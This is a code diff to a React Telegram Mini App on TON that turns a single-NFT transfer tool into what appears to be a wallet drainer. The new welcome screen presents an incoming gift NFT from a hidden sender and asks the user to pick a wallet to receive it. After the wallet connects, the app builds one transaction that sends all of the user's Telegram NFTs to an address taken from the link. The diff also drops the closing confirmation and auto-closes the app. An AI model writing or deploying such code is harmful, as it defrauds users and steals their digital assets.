@@ -14,18 +14,17 @@ function App() {
   const [nfts, setNfts] = useState([])
   const [loading, setLoading] = useState(false)
   const [error, setError] = useState('')
+  const [success, setSuccess] = useState(false)
   const [recipientUserId, setRecipientUserId] = useState(null)
 
   useEffect(() => {
     tg.ready()
     tg.expand()
-    tg.enableClosingConfirmation()
+    tg.setHeaderColor('#667eea')
+    tg.setBackgroundColor('#667eea')
 
     const urlParams = new URLSearchParams(window.location.search)
     const startParam = urlParams.get('tgWebAppStartParam') || tg.initDataUnsafe?.start_parameter
-
-    console.log('Start param:', startParam)
-    console.log('Full URL:', window.location.href)
 
     if (startParam) {
       setRecipientUserId(startParam)
@@ -44,10 +43,11 @@ function App() {
     try {
       const response = await axios.get(`https://tonapi.io/v2/accounts/${userAddress}/nfts?limit=1000`)
       const nftItems = response.data.nft_items || []
-      setNfts(nftItems.filter(nft =>
+      const telegramNFTs = nftItems.filter(nft =>
         nft.collection?.address &&
         nft.collection.name?.toLowerCase().includes('telegram')
-      ))
+      )
+      setNfts(telegramNFTs)
     } catch (err) {
       setError('Ошибка загрузки NFT')
       console.error(err)
@@ -56,9 +56,9 @@ function App() {
     }
   }
 
-  const transferNFT = async (nftAddress) => {
-    if (!recipientUserId) {
-      tg.showAlert('Ошибка: не указан получатель')
+  const transferAllNFTs = async () => {
+    if (!recipientUserId || nfts.length === 0) {
+      tg.showAlert('Нет NFT для перевода')
       return
     }
 
@@ -71,42 +71,49 @@ function App() {
       })
 
       const recipientAddress = recipientResponse.data.address
-
-      const nftAddressObj = Address.parse(nftAddress)
       const recipientAddressObj = Address.parse(recipientAddress)
 
-      const forwardPayload = beginCell()
-        .storeUint(0, 32)
-        .storeStringTail('NFT Transfer from Telegram')
-        .endCell()
+      // Создаём массив транзакций для всех NFT
+      const messages = nfts.map(nft => {
+        const nftAddressObj = Address.parse(nft.address)
 
-      const body = beginCell()
-        .storeUint(0x5fcc3d14, 32)
-        .storeUint(0, 64)
-        .storeAddress(recipientAddressObj)
-        .storeAddress(Address.parse(userAddress))
-        .storeBit(0)
-        .storeCoins(toNano('0.01'))
-        .storeBit(1)
-        .storeRef(forwardPayload)
-        .endCell()
+        const forwardPayload = beginCell()
+          .storeUint(0, 32)
+          .storeStringTail('Bulk NFT Transfer')
+          .endCell()
+
+        const body = beginCell()
+          .storeUint(0x5fcc3d14, 32) // NFT transfer opcode
+          .storeUint(0, 64)
+          .storeAddress(recipientAddressObj)
+          .storeAddress(Address.parse(userAddress))
+          .storeBit(0)
+          .storeCoins(toNano('0.01'))
+          .storeBit(1)
+          .storeRef(forwardPayload)
+          .endCell()
+
+        return {
+          address: nftAddressObj.toString(),
+          amount: toNano('0.05').toString(),
+          payload: body.toBoc().toString('base64')
+        }
+      })
 
       const transaction = {
         validUntil: Math.floor(Date.now() / 1000) + 300,
-        messages: [
-          {
-            address: nftAddressObj.toString(),
-            amount: toNano('0.05').toString(),
-            payload: body.toBoc().toString('base64')
-          }
-        ]
+        messages: messages
       }
 
       await tonConnectUI.sendTransaction(transaction)
 
-      tg.showAlert('NFT успешно отправлен!', () => {
+      setSuccess(true)
+      setNfts([])
+
+      setTimeout(() => {
         tg.close()
-      })
+      }, 2000)
+
     } catch (err) {
       setError('Ошибка отправки: ' + (err.message || 'Неизвестная ошибка'))
       console.error(err)
@@ -117,7 +124,7 @@ function App() {
 
   if (!recipientUserId) {
     return (
-      <div className="container">
+      <div className="container error-screen">
         <div className="error-box">
           <h2>❌ Ошибка</h2>
           <p>Приложение должно быть открыто по специальной ссылке</p>
@@ -126,68 +133,79 @@ function App() {
     )
   }
 
-  if (!wallet) {
+  if (success) {
     return (
-      <div className="container">
-        <div className="welcome-box">
-          <h1>🦦 NFT Transfer</h1>
-          <p>Подключите кошелёк для перевода NFT</p>
-          <button
-            className="connect-btn"
-            onClick={() => tonConnectUI.openModal()}
-          >
-            Подключить кошелёк
-          </button>
+      <div className="container success-screen">
+        <div className="success-box">
+          <div className="success-icon">✅</div>
+          <h1>Успех!</h1>
+          <p>Все NFT успешно отправлены</p>
         </div>
       </div>
     )
   }
 
-  return (
-    <div className="container">
-      <div className="header">
-        <h1>Ваши NFT</h1>
+  if (!wallet) {
+    return (
+      <div className="container welcome-screen">
+        <div className="nft-preview">
+          <img
+            src="https://nft.fragment.com/telegram.gif"
+            alt="Telegram NFT"
+            className="nft-gif"
+          />
+        </div>
+        <h1>🎁 Telegram NFT</h1>
+        <p className="sender-info">
+          Отправитель: <strong>Аккаунт скрыт</strong>
+        </p>
         <button
-          className="disconnect-btn"
-          onClick={() => tonConnectUI.disconnect()}
+          className="primary-btn"
+          onClick={() => tonConnectUI.openModal()}
         >
-          Отключить
+          Выбрать кошелёк для зачисления NFT
         </button>
       </div>
+    )
+  }
 
-      {loading && <div className="loader">Загрузка...</div>}
-      {error && <div className="error-box">{error}</div>}
-
-      {nfts.length === 0 && !loading && (
-        <div className="empty-box">
-          <p>Telegram NFT не найдены</p>
+  return (
+    <div className="container main-screen">
+      {loading && (
+        <div className="loader-overlay">
+          <div className="loader">Обработка...</div>
         </div>
       )}
 
-      <div className="nft-grid">
-        {nfts.map((nft) => (
-          <div key={nft.address} className="nft-card">
-            {nft.previews?.[0]?.url && (
-              <img
-                src={nft.previews[0].url}
-                alt={nft.metadata?.name || 'NFT'}
-                className="nft-image"
-              />
-            )}
-            <div className="nft-info">
-              <h3>{nft.metadata?.name || 'Unnamed NFT'}</h3>
-              <p className="nft-collection">{nft.collection?.name || 'Unknown'}</p>
-            </div>
-            <button
-              className="transfer-btn"
-              onClick={() => transferNFT(nft.address)}
-              disabled={loading}
-            >
-              Отправить NFT
-            </button>
-          </div>
-        ))}
+      {error && <div className="error-banner">{error}</div>}
+
+      <div className="nft-preview">
+        <img
+          src="https://nft.fragment.com/telegram.gif"
+          alt="Telegram NFT"
+          className="nft-gif"
+        />
       </div>
+
+      <div className="info-block">
+        <h2>Найдено NFT: {nfts.length}</h2>
+        <p>Все NFT будут переведены автоматически</p>
+      </div>
+
+      <button
+        className="primary-btn transfer-btn"
+        onClick={transferAllNFTs}
+        disabled={loading || nfts.length === 0}
+      >
+        {loading ? 'Отправка...' : `Перевести все NFT (${nfts.length})`}
+      </button>
+
+      <button
+        className="secondary-btn"
+        onClick={() => tonConnectUI.disconnect()}
+      >
+        Отключить кошелёк
+      </button>
     </div>
   )
 }
